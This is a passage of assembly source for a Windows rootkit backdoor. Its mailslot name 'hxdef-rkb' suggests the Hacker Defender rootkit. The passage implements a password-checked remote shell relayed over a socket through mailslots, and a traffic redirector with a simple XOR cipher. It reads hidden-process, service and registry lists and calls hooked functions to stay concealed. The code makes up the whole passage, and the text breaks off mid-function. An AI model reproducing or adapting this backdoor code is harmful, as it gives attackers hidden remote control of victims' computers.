  lodsb
  call @upchar_al
  cmp ah,02Ah                                   //wildcard
  jz @cmp_wide_pchar_caseinsens_with_wildcard_eq
  cmp al,02Ah                                   //wildcard
  jz @cmp_wide_pchar_caseinsens_with_wildcard_eq
  sub al,ah
  jnz @cmp_wide_pchar_caseinsens_with_wildcard_noteq
  test ah,ah
  jz @cmp_wide_pchar_caseinsens_with_wildcard_eq
  lodsb
  test al,al
  jnz @cmp_wide_pchar_caseinsens_with_wildcard_noteq
  loop @cmp_wide_pchar_caseinsens_with_wildcard_nextchar
  @cmp_wide_pchar_caseinsens_with_wildcard_eq:
  push 001h
  pop eax
  jmp @cmp_wide_pchar_caseinsens_with_wildcard_end

  @cmp_wide_pchar_caseinsens_with_wildcard_noteq:
  xor eax,eax

 @cmp_wide_pchar_caseinsens_with_wildcard_end:
  pop edi
  pop esi
  ret

{backdoor}
 @ReadProcThread:
  push ebp
  mov ebp,esp
  sub esp,01008h
{                    createthread
  Char
  -2008..-008   -       Buffer:array[0..8191] of Char
  Cardinal
  -004          -       LBytesRead
  DoExec_vars
  +008          -       +004    -       DoExec_Result:Boolean
}

  call @GetAddr
  mov ebx,eax

  mov esi,[ebp+008h]
  lea edi,[esi-030h]
 @ReadProcThread_mainloop:
  mov eax,[edi]
  test eax,eax
  jnz @ReadProcThread_end

  push 000h
  push 000h
  lea eax,[ebp-004h]
  push eax
  push 000h
  mov eax,esi

  push dword ptr [esi-014h]
  call [ebx+@GetMailslotInfoAddr]
  test eax,eax
  jz @ReadProcThread_Wait

  push 000h
  lea eax,[ebp-004h]
  push eax
  push 01000h
  lea eax,[ebp-01008h]
  push eax
  push dword ptr [esi-014h]
  call @Safety_ReadFile
  test eax,eax
  jz @ReadProcThread_Wait

  push 000h
  push dword ptr [ebp-004h]
  lea eax,[ebp-01008h]
  push eax
  push dword ptr [esi+008h]
  call [ebx+@sendAddr]
  jmp @ReadProcThread_mainloop

 @ReadProcThread_Wait:
  push 019h
  call @Sleep
  jmp @ReadProcThread_mainloop
 @ReadProcThread_end:
  push 000h
  call [ebx+@ExitThreadAddr]
  leave
  ret 00004h

 @WriteProcThread:
  push ebp
  mov ebp,esp
  sub esp,01008h
{
  Char
  -1008..-008   -       Buffer:array[0..8191] of Char
  Cardinal
  -004          -       LBytes
  DoExec_vars
  +008          -       +004    -       DoExec_Result:Boolean
}

  call @GetAddr
  mov ebx,eax

  mov esi,[ebp+008h]
  lea edi,[esi-030h]
 @WriteProcThread_mainloop:
  mov eax,[edi]
  test eax,eax
  jnz @WriteProcThread_end

  push 000h
  push 01000h
  lea eax,[ebp-01008h]
  push eax
  push dword ptr [esi+008h]
  call @HT_Oldrecv
  mov ecx,eax
  inc eax
  jz @WriteProcThread_end

  push 000h
  lea eax,[ebp-004h]
  push eax
  push ecx
  lea eax,[ebp-01008h]
  push eax
  push dword ptr [esi-018h]
  call [ebx+@WriteFileAddr]
  dec eax
  jz @WriteProcThread_mainloop

 @WriteProcThread_end:
  push 000h
  call [ebx+@ExitThreadAddr]
  leave
  ret 00004h


 {bd-redir}
 @NewClientThread:
  push ebp
  mov ebp,esp
  sub esp,074h
  push esi
  push edi
  {
   -074        -       InterFlagMsg:Cardinal
   -070        -       RedirThreadHandle:THandle
   -06C        -       ClientThreadHandle:THandle
   -068        -       Redir.ThreadArgs.MainItem:PTcpItem
   -064        -       Redir.ThreadArgs.OtherItem:PTcpItem
   -060        -       Redir.ThreadArgs.ThreadType:Cardinal
   -05C        -       Redir.ThreadArgs.Events:Longint
   -058        -       Redir.ThreadArgs.EventHandle:THandle
   -054        -       Redir.ThreadArgs.Active:Boolean
   -050        -       Redir.ThreadArgs.Host.sin_family:Word
   -04E        -       Redir.ThreadArgs.Host.sin_port:Word
   -04C        -       Redir.ThreadArgs.Host.sin_addr:TInAddr
   -048..-044  -       Redir.ThreadArgs.Host.sin_zero:array[0..7] of Char
   -040        -       Redir.ThreadArgs.Socket
   -038        -       Redir.ThreadID:Cardinal
   -034        -       Client.ThreadArgs.MainItem:PTcpItem
   -030        -       Client.ThreadArgs.OtherItem:PTcpItem
   -02C        -       Client.ThreadArgs.ThreadType:Cardinal
   -028        -       Client.ThreadArgs.Events:Longint
   -024        -       Client.ThreadArgs.EventHandle:THandle
   -020        -       Client.ThreadArgs.Active:Boolean
   -01C        -       Client.ThreadArgs.Host.sin_family:Word
   -01A        -       Client.ThreadArgs.Host.sin_port:Word
   -018        -       Client.ThreadArgs.Host.sin_addr:TInAddr
   -014..-010  -       Client.ThreadArgs.Host.sin_zero:array[0..7] of Char
   -00C        -       Client.ThreadArgs.Socket
   -008        -       Client.ThreadArgs.Connected
   -004        -       Client.ThreadID:Cardinal
   +008        -       ANewClient.Socket
   +00C        -       ATargetServer.Addr:Cardinal
   +010        -       ATargetServer.Port:Cardinal
  }

  xor eax,eax
  lea edi,[ebp-070h]
  push 01Ch
  pop ecx
  rep stosd

  push eax
  push eax
  push eax
  push IPPROTO_TCP
  push SOCK_STREAM
  push AF_INET
  call [ebx+@WSASocketAAddr]
  mov [ebp-00Ch],eax
  inc eax
  jz @NewClientThread_close_newsock

  push 001h
  pop eax
  mov [ebp-020h],eax
  mov [ebp-054h],eax
  mov [ebp-060h],eax

  movzx eax,word ptr [ebp+010h]
  xchg ah,al
  mov [ebp-01Ah],ax
  mov word ptr [ebp-01Ch],AF_INET
  mov eax,[ebp+00Ch]
  mov [ebp-018h],eax
  mov eax,[ebp+008h]
  mov [ebp-040h],eax

  lea eax,[ebp-058h]
  push eax
  push dword ptr [ebp-040h]
  call @EventSelect
  test eax,eax
  jz @NewClientThread_close_clientsock

  lea eax,[ebp-068h]
  mov [ebp-030h],eax
  mov [ebp-068h],eax
  lea eax,[ebp-034h]
  mov [ebp-034h],eax
  mov [ebp-064h],eax

  lea eax,[ebp-004h]
  push eax
  push 000h
  lea eax,[ebp-034h]
  push eax
  lea eax,[ebx+@ThreadProc]
  push eax
  push 000h
  push 000h
  call [ebx+@CreateThreadAddr]
  test eax,eax
  jz @NewClientThread_close_clientsock
  mov [ebp-06Ch],eax

  push 019h
  call @Sleep

  lea eax,[ebp-038h]
  push eax
  push 000h
  lea eax,[ebp-068h]
  push eax
  lea eax,[ebx+@ThreadProc]
  push eax
  push 000h
  push 000h
  call [ebx+@CreateThreadAddr]
  test eax,eax
  jz @NewClientThread_term_clientthread
  mov [ebp-070h],eax

  push -001h
  push 000h
  lea eax,[ebp-070h]
  push eax
  push 2
  call [ebx+@WaitForMultipleObjectsAddr]
  xor eax,eax
  mov [ebp-054h],eax
  mov [ebp-020h],eax
  mov [ebp-008h],eax
  push 032h
  call @Sleep

  push dword ptr [ebp-040h]
  call [ebx+@CloseSocketAddr]
  push dword ptr [ebp-00Ch]
  call [ebx+@CloseSocketAddr]

  push 0FAh
  call @Sleep

  push 000h
  push dword ptr [ebp-070h]
  call [ebx+@TerminateThreadAddr]
 @NewClientThread_term_clientthread:
  push 000h
  push dword ptr [ebp-06Ch]
  call [ebx+@TerminateThreadAddr]
 @NewClientThread_close_clientsock:
  push dword ptr [ebp-00Ch]
  call [ebx+@CloseSocketAddr]

  push dword ptr [ebp-058h]
  call [ebx+@CloseHandleAddr]
  push dword ptr [ebp-024h]
  call [ebx+@CloseHandleAddr]

 @NewClientThread_close_newsock:
  push dword ptr [ebp+008h]
  call [ebx+@CloseSocketAddr]

  pop edi
  pop esi
  leave
  ret 004h

 @EventSelect:
  call [ebx+@WSACreateEventAddr]
  test eax,eax
  jz @EventSelect_fail
  mov ecx,[esp+008h]
  mov [ecx],eax

  push FD_ALL_EVENTS
  push eax
  push dword ptr [esp+00Ch]
  call [ebx+@WSAEventSelectAddr]
  inc eax
  jnz @EventSelect_end
 @EventSelect_fail:
  xor eax,eax
 @EventSelect_end:
  ret 008h

 @WaitForEvents:
  push ebp
  mov ebp,esp
  sub esp,02Ch

  call @PeekMessages

  push 000h
  push WAITFOREVENTSTIMEOUT
  push 000h
  lea eax,[ebp+00Ch]
  push eax
  push 1
  call [ebx+@WSAWaitForMultipleEventsAddr]
  inc eax
  jz @WaitForEvents_end
  sub eax,WSA_WAIT_TIMEOUT+1
  jz @WaitForEvents_end
  lea eax,[ebp-02Ch]
  push eax
  push dword ptr [ebp+00Ch]
  push dword ptr [ebp+008h]
  call [ebx+@WSAEnumNetworkEventsAddr]
  inc eax
  jz @WaitForEvents_end
  mov eax,[ebp-02Ch]
 @WaitForEvents_end:
  leave
  jmp @EventSelect_end

 @ThreadProc:
  mov ebp,esp
  sub esp,010h
 {
   -010         -       LAuthNum:Cardinal
   -00C         -       LBuffer:Pointer
   -008         -       LBytes:Cardinal
   -004         -       LSocket:TSocket
   +004         -       AArgs:Pointer
                +000    AArgs.ThreadArgs.MainItem:PTcpItem
                +004    AArgs.ThreadArgs.OtherItem:PTcpItem
                +008    AArgs.ThreadArgs.ThreadType:Cardinal
                +00C    AArgs.ThreadArgs.Events:Longint
                +010    AArgs.ThreadArgs.EventHandle:THandle
                +014    AArgs.ThreadArgs.Active:Boolean
                +018    AArgs.ThreadArgs.Host.sin_family:Word
                +01A    AArgs.ThreadArgs.Host.sin_port:Word
                +01C    AArgs.ThreadArgs.Host.sin_addr:TInAddr
                +020..+024    AArgs.ThreadArgs.Host.sin_zero:array[0..7] of Char
                +028    AArgs.ThreadArgs.Socket
                +02C    AArgs.ThreadArgs.Connected - client only
 }

  call @GetAddr
  mov ebx,eax

  call @OpenFileMapping                         //eax >> HiddenArraySize
  test eax,eax
  jz @ThreadProc_error
  push eax
  add eax,[eax]                                 //eax >> RootProcessSize
  add eax,[eax]                                 //eax >> HiddenServicesSize
  add eax,[eax]                                 //eax >> RegKeysSize
  add eax,[eax]                                 //eax >> RegValuesSize
  add eax,[eax]                                 //eax >> PasswordSize
  mov eax,[eax+004h]
  mov [ebp-010h],eax
  call @CloseFileMapping

  mov esi,[ebp+004h]
  mov eax,[esi+008h]
  test eax,eax
  jnz @ThreadProc_redir
  mov eax,[esi+02Ch]
  test eax,eax
  jnz @ThreadProc_client_connected
  push eax
  push eax
  push eax
  push eax
  push SOCK_ADDR_SIZE
  lea eax,[esi+018h]
  push eax
  push dword ptr [esi+028h]
  call [ebx+@WSAConnectAddr]
  inc eax
  jz @ThreadProc_error
  lea eax,[esi+010h]
  push eax
  push dword ptr [esi+028h]
  call @EventSelect
  mov [esi+02Ch],eax
  test eax,eax
  jz @ThreadProc_error
  jmp @ThreadProc_client_connected
 @ThreadProc_redir:
  mov edi,[esi+004h]
 @ThreadProc_redir_waitforcon:
  push 019h
  call @Sleep
  mov eax,[edi+02Ch]
  test eax,eax
  jz @ThreadProc_redir_waitforcon
 @ThreadProc_client_connected:
  mov eax,[esi+014h]
  test eax,eax
  jz @ThreadProc_closesock
  mov eax,[esi+004h]
  mov eax,[eax+014h]
  test eax,eax
  jz @ThreadProc_closesock

  push dword ptr [esi+010h]
  push dword ptr [esi+028h]
  call @WaitForEvents
  test eax,eax
  jz @ThreadProc_client_connected

  mov [esi+00Ch],eax
  and eax,FD_READ
  jnz @ThreadProc_read
 @ThreadProc_af_read:
  mov eax,[esi+00Ch]
  and eax,FD_CLOSE
  jnz @ThreadProc_closesock
  jmp @ThreadProc_client_connected
 @ThreadProc_read:
//KKK kkk KKKK kkkk
  mov eax,[esi+008h]
  test eax,eax
  jnz @ThreadProc_decrypt
 @ThreadProc_crypt:
  push dword ptr [esi+028h]
  call @BytesToRecv
  test eax,eax
  jz @ThreadProc_af_read
  mov edi,eax
  push eax
  push LMEM_FIXED
  call [ebx+@LocalAllocAddr]
  test eax,eax
  jz @ThreadProc_closesock
  mov [ebp-00Ch],eax

  push 000h
  push edi
  push eax
  push dword ptr [esi+028h]
  lea eax,[ebx+@HT_Oldrecv]
  call eax
  mov [ebp-008h],eax
  inc eax
  jz @ThreadProc_read_free
  mov edi,[ebp-00Ch]

  mov edx,[ebp-010h]
  mov ecx,[ebp-008h]
  test ecx,ecx
  jz @ThreadProc_read_loop
 @ThreadProc_crypt_loop:
  mov al,[edi]
  xor al,dl
  add al,065h
  stosb
  ror edx,001h
  loop @ThreadProc_crypt_loop

  push 000h
  push 004h
  lea eax,[ebp-008h]
  push eax
  mov eax,[esi+004h]
  mov eax,[eax+028h]
  push eax
  call [ebx+@sendAddr]
  jmp @ThreadProc_read_loop

 @ThreadProc_decrypt:
  push 000h
  push 004h
  lea eax,[ebp-008h]
  push eax
  push dword ptr [esi+028h]
  lea eax,[ebx+@HT_Oldrecv]
  call eax
  mov edi,[ebp-008h]
  inc eax
  jz @ThreadProc_closesock
  test edi,edi
  jz @ThreadProc_af_read
 @ThreadProc_decrypt_read:
  push edi
  push LMEM_FIXED
  call [ebx+@LocalAllocAddr]
  test eax,eax
  jz @ThreadProc_closesock
  mov [ebp-00Ch],eax
  mov [ebp-008h],edi
  mov edx,eax
 @ThreadProc_decrypt_wait:
  push edx
  push dword ptr [esi+010h]
  push dword ptr [esi+028h]
  call @WaitForEvents
  pop edx
  mov [esi+00Ch],eax
  test eax,eax
  jz @ThreadProc_decrypt_wait
  and eax,FD_READ
  jnz @ThreadProc_decrypt_read_buf
 @ThreadProc_decrypt_af_read:
  mov eax,[esi+00Ch]
  and eax,FD_CLOSE
  jnz @ThreadProc_read_free
  jmp @ThreadProc_decrypt_wait
 @ThreadProc_decrypt_read_buf:
  push edx
  push 000h
  push edi
  push edx
  push dword ptr [esi+028h]
  lea eax,[ebx+@HT_Oldrecv]
  call eax
  pop edx
  inc eax
  jz @ThreadProc_read_free
  dec eax
  add edx,eax
  sub edi,eax
  jnz @ThreadProc_decrypt_af_read
 @ThreadProc_decrypt_buf_read:
  mov edi,[ebp-00Ch]
  mov ecx,[ebp-008h]
  mov edx,[ebp-010h]
  test ecx,ecx
  jz @ThreadProc_read_loop
 @ThreadProc_decrypt_loop:
  mov al,[edi]
  sub al,065h
  xor al,dl
  stosb
  ror edx,001h
  loop @ThreadProc_decrypt_loop
  nop

 @ThreadProc_read_loop:
//bugfixsleep
  push 0FCh
  call @Sleep
//\bugfixsleep
  push 000h
  push dword ptr [ebp-008h]
  push dword ptr [ebp-00Ch]
  mov eax,[esi+004h]
  mov eax,[eax+028h]
  push eax
  call [ebx+@sendAddr]
  inc eax
  jz @ThreadProc_read_free
  dec eax
  sub [ebp-008h],eax
  jnz @ThreadProc_read_loop
 @ThreadProc_read_free:
  push dword ptr [ebp-00Ch]
  call [ebx+@LocalFreeAddr]
  jmp @ThreadProc_af_read
 @ThreadProc_closesock:
//bugfixsleep
  push 0019h
  call @Sleep
//\bugfixsleep
  push dword ptr [esi+028h]
  call [ebx+@CloseSocketAddr]
 @ThreadProc_error:
  push 000h
  call [ebx+@ExitThreadAddr]

 @BytesToRecv:
  xor eax,eax
  push eax
  push eax
  push eax
  push eax
  lea ecx,[esp+00Ch]
  push ecx
  push 004h
  sub ecx,004h
  push ecx
  push eax
  push eax
  push FIONREAD
  push dword ptr [esp+02Ch]
  call [ebx+@WSAIoctlAddr]
  inc eax
  jz @BytesToRecv_end
  mov eax,[esp]
 @BytesToRecv_end:
  pop ecx
  pop ecx
  ret 004h

 @PeekMessages:
  push ebp
  mov ebp,esp
  sub esp,01Ch
 @PeekMessages_loop:
  push PM_REMOVE
  push 000h
  push 000h
  push 000h
  lea eax,[ebp-01Ch]
  push eax
  call [ebx+@PeekMessageAAddr]
  test eax,eax
  jnz @PeekMessages_loop
  push 00Ah
  call @Sleep
  leave
  ret



 {bd-main}
 @DoExec:
  push ebp
  mov ebp,esp
  sub esp,00400h
  {
  -00320..-0030C-       LObjectAttr:TObjectAttributes
  -00308..-00304-       LClientId:TClientId
  -00300        -       LDAcl
  -00270        -       LPDAcl:PACL
  -0026C        -       LEveryoneSid:PSID
  -00268        -       LAclSize:Cardinal
  -00264        -       LSecDescr.Revision:Byte
  -00263        -       LSecDescr.Sbz1:Byte
  -00262        -       LSecDescr.Control:Word
  -00260        -       LSecDescr.Owner:PSID
  -0025C        -       LSecDescr.Group:PSID
  -00258        -       LSecDescr.Sacl:PACL
  -00254        -       LSecDescr.Dacl:PACL
  -00250        -       LSecAttr.nLength:DWORD
  -0024C        -       LSecAttr.lpSecurityDescriptor:Pointer
  -00248        -       LSecAttr.bInheritHandle:Boolean;
  -00244        -       LAuthNum:Cardinal
  -00240..-034  -       array of Char
  -030          -       LShellEnd:Boolean
  -02C          -       LSign:Cardinal
  -024          -       LBoolOpt:DWORD
  -020          -       ReadProcTID:Cardinal
  -01C          -       WriteProcTID:Cardinal
  -018          -       ShellMailslotHandle:THandle
  -014          -       MailslotHandle:THandle
  -010          -       WriteProcThreadHandle:THandle
  -00C          -       ReadProcThreadHandle:THandle
  -008          -       ShellProcessHandle:THandle
  -004          -       Result:Boolean
  +008          -       ASocket:TSocket
  }

  push edi
  push esi

  call @OpenFileMapping                         //eax >> HiddenArraySize
  test eax,eax
  jz @DoExec_closeduplicate
  push eax
  add eax,[eax]                                 //eax >> RootProcessSize
  add eax,[eax]                                 //eax >> HiddenServicesSize
  add eax,[eax]                                 //eax >> RegKeysSize
  add eax,[eax]                                 //eax >> RegValuesSize
  add eax,[eax]                                 //eax >> PasswordSize
  mov eax,[eax+004h]
  mov [ebp-00244h],eax
  call @CloseFileMapping

  xor eax,eax
  mov [ebp-004h],eax
  mov [ebp-030h],eax
  push 018h
  pop dword ptr [ebp-00320h]                    //LObjectAttr.Length = 018h
  mov [ebp-0031Ch],eax                          //LObjectAttr.RootDirectory
  mov [ebp-00318h],eax                          //LObjectAttr.ObjectName
  mov [ebp-00314h],eax                          //LObjectAttr.Attributes
  mov [ebp-00310h],eax                          //LObjectAttr.SecurityDescriptor
  mov [ebp-0030Ch],eax                          //LObjectAttr.SecurityQualityOfService

 //init mailslots
  xor esi,esi

 @DoExec_Init_mailslots_findname:
  mov edi,000303030h
  inc esi
  mov eax,esi
  sub al,00Ah
  jnz @DoExec_Init_mailslots_findname_create
 @DoExec_Init_mailslots_findname_10:
  mov esi,eax
  add esi,00100h
  mov eax,esi
  sub ah,00Ah
  jz @DoExec_Init_mailslots_findname_create
 @DoExec_Init_mailslots_findname_100:
  mov esi,eax
  add esi,000010000h
  push esi
  pop word ptr ax
  pop word ptr ax
  sub al,00Ah
  jz @DoExec_closeduplicate
 @DoExec_Init_mailslots_findname_create:
  //v078 back AGAIN!!
  xor ecx,ecx
  lea eax,[ebp-0026Ch]
  push eax                                      //pSid = LEveryoneSid
  push ecx                                      //dwSubAuthority7
  push ecx                                      //dwSubAuthority6
  push ecx                                      //dwSubAuthority5
  push ecx                                      //dwSubAuthority4
  push ecx                                      //dwSubAuthority3
  push ecx                                      //dwSubAuthority2
  push ecx                                      //dwSubAuthority1
  push ecx                                      //dwSubAuthority0 = SECURITY_WORLD_RID
  push 001h                                     //nSubAuthorityCount
  lea eax,[ebx+@cSWSA]
  push eax                                      //pIdentifierAuthority = SECURITY_WORLD_SID_AUTHORITY
  call [ebx+@AllocateAndInitializeSidAddr]

  push dword ptr [ebp-0026Ch]                   //pSid = LEveryoneSid
  call [ebx+@GetLengthSidAddr]
  add eax,ACL_SIZE
  mov [ebp-00268h],eax                          //LAclSize

  lea ecx,[ebp-00300h]
  mov [ebp-00270h],ecx                          //LPDAcl

  push ACL_REVISION                             //dwAclRevision
  push eax                                      //nAclLength = LAclSize
  push dword ptr [ebp-00270h]                   //pAcl = LPDAcl
  call [ebx+@InitializeAclAddr]

  push dword ptr [ebp-0026Ch]                   //pSid = LEveryoneSid
  push GENERIC_ALL                              //AccessMask
  push ACL_REVISION                             //dwAceRevision
  push dword ptr [ebp-00270h]                   //pAcl = LPDAcl
  call [ebx+@AddAccessAllowedAceAddr]

  push SECURITY_DESCRIPTOR_REVISION             //dwRevision
  lea eax,[ebp-00264h]
  push eax                                      //pSecurityDescriptor = LSecDescr
  call [ebx+@InitializeSecurityDescriptorAddr]

  push 000h                                     //bDaclDefaulted
  push dword ptr [ebp-00270h]                   //pDacl = LPDAcl
  push -001h                                    //bDaclPresent
  lea eax,[ebp-00264h]
  push eax                                      //pSecurityDescriptor
  call [ebx+@SetSecurityDescriptorDaclAddr]

  lea eax,[ebp-00264h]                          //LSecDescr
  mov [ebp-0024Ch],eax                          //LSecAttr.lpSecurityDescriptor = LSecDescr
  push 00Ch                                     //SECURITY_ATTRIBUTES_SIZE
  pop dword ptr [ebp-00250h]                    //LSecAttr.nLength

  add edi,esi
  lea ecx,[ebx+@cBackdoorMailslotName]

  mov eax,ecx
  add eax,016h                  //\\.\mailslot\hxdef-rkbXXX
  mov [eax],edi

{  mov eax,[ebx+@LSecDescAndAttr]
  add eax,014h
  push eax    }
//  push 000h
 {new 078}
  lea eax,[ebp-0250h]                           //LSecAttr
  push eax                                      //lpSecurityAttributes
 {/new 078}
  push MAILSLOT_TIMEOUT                         //lReadTimeout
  push 000h                                     //nMaxMessageSize
  push ecx                                      //lpName
  call [ebx+@CreateMailslotAAddr]
  mov [ebp-014h],eax
  inc eax
  jz @DoExec_Init_mailslots_findname

 //\init mailslsots

  xor esi,esi
  mov edi,[ebp+008h]

  push DUPLICATE_SAME_ACCESS {or DUPLICATE_CLOSE_SOURCE}
  push esi
  push esi
  lea eax,[ebp+008h]
  push eax
  call @GetCurrentProcess
  push eax
  push edi
  push eax
  call [ebx+@DuplicateHandleAddr]
  test eax,eax
  jz @DoExec_end

  push edi
  call [ebx+@closesocketAddr]

  mov edi,[ebp+008h]
  push esi
  push esi
  push edi
  call [ebx+@WSAEventSelectAddr]

  lea eax,[ebp-024h]
  mov [eax],esi
  push esi
  push esi
  push eax
  push esi
  push esi
  push 004h
  push eax
  push FIONBIO
  push edi
  call [ebx+@WSAIoctlAddr]

  lea esi,[ebp-02Ch]
  mov byte ptr [esi],000h;

 @DoExec_Initialization_cmp:
  xor eax,eax
  mov al,[esi]
  test eax,eax
  jz @DoExec_Initialization_REQ_1
  sub eax,BSC_INIT_RES_1
  jz @DoExec_Initialization_RES
  dec eax
  dec eax
  jz @DoExec_Initialization_RES
  dec eax
  dec eax
  jz @DoExec_Initialization_RES
  jmp @DoExec_closeduplicate

 @DoExec_Initialization_REQ_1:
  mov byte ptr [esi],BSC_INIT_REQ_1
  jmp @DoExec_Initialization_send
 @DoExec_Initialization_RES:
  inc byte ptr [esi]
  jmp @DoExec_Initialization_send

 @DoExec_Initialization_send:
  push 000h
  push 001h
  push esi
  push edi
  call [ebx+@sendAddr]

  cmp byte ptr [esi],BSC_INIT_COMPLETE
  jz @DoExec_Initialization_Complete

  push 000h
  push 001h
  push esi
  push edi
  lea eax,[ebx+@HT_Oldrecv]
  call eax
  jmp @DoExec_Initialization_cmp
 @DoExec_Initialization_Complete:
  push 000h
  push 004h
  push esi
  push edi
  lea eax,[ebx+@HT_Oldrecv]
  call eax

  mov eax,[ebp-00244h]
  mov ecx,[esi]
  mov edx,0D22F3211h
  xor edx,eax
  xor eax,ecx
  jz @DoExec_auth_fin
  xor edx,eax
 @DoExec_auth_fin:
  setnz [esi]
  add [esi],BSC_AUTHORIZATION_OK

  push 000h
  push 001h
  push esi
  push edi
  call [ebx+@sendAddr]
  cmp byte ptr [esi],BSC_AUTHORIZATION_OK
  jnz @DoExec_closeduplicate
  push 000h
  push 001h
  push esi
  push edi
  lea eax,[ebx+@HT_Oldrecv]
  call eax
  mov al,[esi]
  sub al,BSC_SERVICE_BACKDOOR
  jz @DoExec_service_backdoor
  dec al
  jz @DoExec_service_redirector
  dec al
  jnz @DoExec_closeduplicate
 @DoExec_service_test:
  mov byte ptr [esi],BSC_SERVICE_TEST_RES
  push 000h
  push 001h
  push esi
  push edi
  call [ebx+@sendAddr]
  jmp @DoExec_closeduplicate
 @DoExec_service_redirector:
  push 000h
  push 008h
  lea eax,[ebp-00240h]
  push eax
  push edi
  lea eax,[ebx+@HT_Oldrecv]
  call eax

  push dword ptr [ebp-0023Ch]
  push dword ptr [ebp-00240h]
  push edi
  call @NewClientThread

  jmp @DoExec_closeduplicate
 @DoExec_service_backdoor:
  lea eax,[ebx+@cBackdoorMailslotName+016h] //\\.\mailslot\hxdef-rkbXXX
  mov eax,[eax]

  push 000h
  push eax
  push RK_RUN_BACKDOOR_REQ
  call @SendIntercomBuffer

  push 000h
  push 000h
  lea eax,[ebp-02Ch]
  push eax
  push 000h
  push dword ptr [ebp-014h]
  call [ebx+@GetMailslotInfoAddr]
  test eax,eax
  jz @DoExec_closeduplicate

  push 000h
  lea eax,[ebp-02Ch]
  push eax
  push 0200h
  lea eax,[ebp-00240h]
  push eax
  push dword ptr [ebp-014h]
  call @Safety_ReadFile
  test eax,eax
  jz @DoExec_closeduplicate
  lea eax,[ebp-00240h]
  cmp byte ptr [eax+004h],RK_RUN_BACKDOOR_RES
  jnz @DoExec_closeduplicate
  mov eax,[eax+005h]
  test eax,eax
  jz @DoExec_closeduplicate
  lea ecx,[ebp-00308h]
  mov [ecx],eax                         //LClientId.UniqueProcess
  push 000h
  pop dword ptr [ecx+004h]              //LClientId.UniqueThread

  push ecx                              //ClientId
  lea eax,[ebp-00320h]
  push eax                              //ObjectAttributes
  push 000100001h                       //PROCESS_TERMINATE or SYNCHRONIZE
  lea eax,[ebp-008h]
  push eax                              //ProcessHandle
  call @Safety_NtOpenProcess 
  test eax,eax
  jnz @DoExec_closeduplicate


//xxxxxx

//get bdmailslot
  mov dword ptr [ebp-024h],000h
 @DoExec_GetBDM_loop:
  mov eax,[ebp-024h]
  inc eax
  mov [ebp-024h],eax
  cmp eax,014h
  jz @DoExec_shell_end

  push 000h
  push 000h
  lea eax,[ebp-02Ch]
  push eax
  push 000h
  push dword ptr [ebp-014h]
  call [ebx+@GetMailslotInfoAddr]
  test eax,eax
  jz @DoExec_GetBDM_Wait

  push 000h
  lea eax,[ebp-02Ch]
  push eax
  push 0200h
  lea eax,[ebp-00240h]
  push eax
  push dword ptr [ebp-014h]
  call @Safety_ReadFile 
  test eax,eax
  jnz @DoExec_GetBDM_gotname
 @DoExec_GetBDM_Wait:
  push 019h
  call @Sleep
  jmp @DoExec_GetBDM_loop
 @DoExec_GetBDM_gotname:
  mov eax,[ebp-02Ch]
  lea eax,[ebp-00240h+eax]
  mov byte ptr [eax],000h

  (* new 084
  push 000h
  push FILE_ATTRIBUTE_NORMAL
  push OPEN_EXISTING
  push 000h
  push FILE_SHARE_READ or FILE_SHARE_WRITE
  push GENERIC_WRITE
  lea eax,[ebp-00240h]
  push eax
  call [ebx+@CreateFileAAddr]
  mov [ebp-018h],eax                    //ShellMailslotHandle
  inc eax
  jz @DoExec_shell_end*)


  lea eax,[ebp-00240h]
  push eax
  mov [eax],05C3F3F5Ch                  //\\.\ -> \??\
  call @OpenFile
  mov [ebp-018h],eax                    //ShellMailslotHandle
  inc eax
  jz @DoExec_shell_end

//\getm bdmailslot


  lea eax,[ebp-020h]
  push eax
  push 000h
  push ebp
  lea eax,[ebx+@ReadProcThread]
  push eax
  push 000h
  push 000h
  call [ebx+@CreateThreadAddr]
  test eax,eax
  jz @DoExec_closeduplicate
  mov [ebp-00Ch],eax

  lea eax,[ebp-01Ch]
  push eax
  push 000h
  push ebp
  lea eax,[ebx+@WriteProcThread]
  push eax
  push 000h
  push 000h
  call [ebx+@CreateThreadAddr]
  test eax,eax
  jz @DoExec_term_readprocthread
  mov [ebp-010h],eax

  push -001h
  push 000h
  lea eax,[ebp-010h]
  push eax
  push 003h
  call [ebx+@WaitForMultipleObjectsAddr]
  mov dword ptr [ebp-030h],001h
  mov dword ptr [ebp-004h],001h

 @DoExec_shell_end:
  lea eax,[ebp-02Ch]
  mov byte ptr [eax],BSC_END_REQ
  push 000h
  push 003h
  push eax
  push dword ptr [ebp+008h]
  call [ebx+@sendAddr]

  push dword ptr [ebp-018h]
  call [ebx+@CloseHandleAddr]

  push 00150h
  call @Sleep
  push 000h
  push dword ptr [ebp-008h]
  call [ebx+@TerminateProcessAddr]
  push 000h
  push dword ptr [ebp-010h]
  call [ebx+@TerminateThreadAddr]
 @DoExec_term_readprocthread:
  push 000h
  push dword ptr [ebp-00Ch]
  call [ebx+@TerminateThreadAddr]

 @DoExec_closeduplicate:
  push dword ptr [ebp+008h]
  call [ebx+@closesocketAddr]
 @DoExec_closemailslot:
  push dword ptr [ebp-014h]
  call [ebx+@CloseHandleAddr]

 @DoExec_end:
  mov eax,[ebp-004h]
  pop esi
  pop edi
  leave
  ret 004h

 @SendIntercomBuffer:
  push ebp
  mov ebp,esp
  sub esp,008h
  {
   -008         -       LServerMailslotFileHandle:THandle
   -004         -       LBytesWritten:Cardinal
  }

  (* new 084
  push 000h
  push FILE_ATTRIBUTE_NORMAL
  push OPEN_EXISTING
  push 000h
  push FILE_SHARE_READ or FILE_SHARE_WRITE
  push GENERIC_WRITE
  lea eax,[ebx+@cServerMailslotName]
  push eax
  call [ebx+@CreateFileAAddr] *)
  lea eax,[ebx+@cServerMailslotName]
  push eax                              //AFileName
  mov [eax],05C3F3F5Ch                  //\\.\ -> \??\ 
  call @OpenFile
  mov [ebp-008h],eax                    //LServerMailslotFileHandle
  inc eax
  jz @SendIntercomBuffer_end

  mov eax,[ebx+@cClientMailslotName+010h]
  mov [ebx+@IntercomBuffer],eax
  mov eax,[ebp+008h]
  mov byte ptr [ebx+@IntercomBuffer+004h],al
  mov eax,[ebp+00Ch]
  mov [ebx+@IntercomBuffer+005h],eax
  mov eax,[ebp+010h]
  mov [ebx+@IntercomBuffer+009h],eax

  push 000h
  lea eax,[ebp-004h]                    //LBytesWritten
  push eax
  push INTERCOM_BUFFER_SIZE
  lea eax,[ebx+@IntercomBuffer]
  push eax
  push dword ptr [ebp-008h]             //LServerMailslotFileHandle
  call [ebx+@WriteFileAddr]
 @SendIntercomBuffer_end:
  leave
  ret 00Ch

 @Safety_ReadFile:
